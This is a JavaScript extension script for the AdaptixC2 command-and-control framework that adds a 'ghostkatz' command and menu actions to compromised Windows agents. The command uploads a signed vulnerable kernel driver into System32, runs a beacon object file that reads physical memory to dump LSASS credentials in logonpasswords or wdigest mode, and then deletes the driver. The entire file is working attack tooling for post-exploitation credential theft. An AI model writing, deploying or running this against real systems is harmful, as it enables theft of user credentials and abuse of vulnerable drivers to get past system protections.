var metadata = {
    name: "GhostKatz",
    description: "Dump credentials from LSASS via signed vulnerable kernel driver (physical memory read). Fork of RainbowDynamix/GhostKatz for AdaptixC2, supporting both Beacon and Kharon."
};

// ── ghostkatz ────────────────────────────────────────────────────────────────
// Original BOF: RainbowDynamix/GhostKatz (https://github.com/RainbowDynamix/GhostKatz)
// AdaptixC2 .axs port: 0xGunrunner (https://github.com/0xGunrunner/GhostKatz-AdaptixC2-Compatible)
//
// Kharon patch: the BOF's strict arg-buffer validation fails on Kharon because
// Kharon's BOF loader leaves 25-32 trailing bytes in the arg buffer after
// extraction where Beacon's loader leaves 0. Patched in main.c to emit a
// non-fatal warning instead of failing.
//
// BOF expected at:     _bin/ghostkatz.x64.o
// Drivers expected at: drivers/tpwsav.sys, drivers/throttlestop.sys

var cmd_ghostkatz = ax.create_command(
    "ghostkatz",
    "Dump credentials from LSASS via signed kernel driver (physical memory read)",
    "ghostkatz logonpasswords -prv 1"
);
cmd_ghostkatz.addArgString("mode", true, "Dump mode: logonpasswords or wdigest");
cmd_ghostkatz.addArgFlagInt("-prv", "provider", "Driver provider: 1=tpwsav.sys, 2=throttlestop.sys", 1);

cmd_ghostkatz.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    if (ax.is64(id) === false) {
        throw new Error("ghostkatz BOF is x64 only");
    }

    let mode         = parsed_json["mode"];
    let provider_num = parsed_json["provider"];
    if (provider_num === undefined || provider_num === null) provider_num = 1;

    // Validate mode
    if (mode !== "logonpasswords" && mode !== "wdigest") {
        ax.console_message(id, "Error: mode must be 'logonpasswords' or 'wdigest'", "error");
        return;
    }

    // Validate provider
    if (provider_num !== 1 && provider_num !== 2) {
        ax.console_message(id, "Error: provider must be 1 (tpwsav.sys) or 2 (throttlestop.sys)", "error");
        return;
    }

    // Resolve driver file and destination path (forward slashes — Win32 file APIs
    // accept them, and this sidesteps Kharon's backslash escape handling).
    let drv_src  = (provider_num === 1) ? "tpwsav.sys" : "throttlestop.sys";
    let drv_dest = "C:/Windows/System32/drivers/" + drv_src;

    // Pack BOF args — matches original CNA format "ziz":
    //   cstr  : "-prv" flag string
    //   int   : provider number (1 or 2)
    //   cstr  : mode string ("logonpasswords" or "wdigest")
    let bof_params = ax.bof_pack("cstr,int,cstr", ["-prv", provider_num, mode]);
    let bof_path   = ax.script_dir() + "_bin/ghostkatz.x64.o";

    // Detect agent type to branch cleanup syntax.
    // Kharon uses `fs rm <path>`; Beacon uses `rm <path>`.
    let agent = ax.agents()[id];
    let is_kharon = (agent["type"] === "kharon");

    // 1) Upload driver — unquoted paths, forward slashes.
    //    On Kharon, quoting paths breaks the parser. On Beacon, unquoted works
    //    fine as long as paths have no spaces (these don't).
    ax.execute_alias(
        id, cmdline,
        `upload ${ax.script_dir()}drivers/${drv_src} ${drv_dest}`,
        "ghostkatz: upload driver"
    );

    // 2) Run the BOF. Empty cmdline on follow-up tasks suppresses the echo.
    ax.execute_alias(
        id, "",
        `execute bof ${bof_path} ${bof_params}`,
        "ghostkatz: dumping via kernel driver"
    );

    // 3) Cleanup driver. fs rm on Kharon, rm on Beacon.
    //    NOTE: allow a few seconds between consecutive runs — firing back-to-back
    //    can race the next upload against the previous fs rm, causing
    //    "Failed to start service : 2" (ERROR_FILE_NOT_FOUND).
    let rm_cmd = is_kharon ? `fs rm ${drv_dest}` : `rm ${drv_dest}`;
    ax.execute_alias(
        id, "",
        rm_cmd,
        "ghostkatz: cleanup driver"
    );
});


/// MENU

let ghostkatz_access_action = menu.create_action("GhostKatz (logonpasswords, tpwsav)", function(agents_id) {
    agents_id.forEach(id => ax.execute_command(id, "ghostkatz logonpasswords -prv 1"));
});
menu.add_session_access(ghostkatz_access_action, ["beacon", "gopher", "kharon"], ["windows"]);

let ghostkatz_wdigest_action = menu.create_action("GhostKatz (wdigest, tpwsav)", function(agents_id) {
    agents_id.forEach(id => ax.execute_command(id, "ghostkatz wdigest -prv 1"));
});
menu.add_session_access(ghostkatz_wdigest_action, ["beacon", "gopher", "kharon"], ["windows"]);


/// GROUP REGISTRATION

var group_ghostkatz = ax.create_commands_group("GhostKatz", [cmd_ghostkatz]);
ax.register_commands_group(group_ghostkatz, ["beacon", "gopher", "kharon"], ["windows"], []);
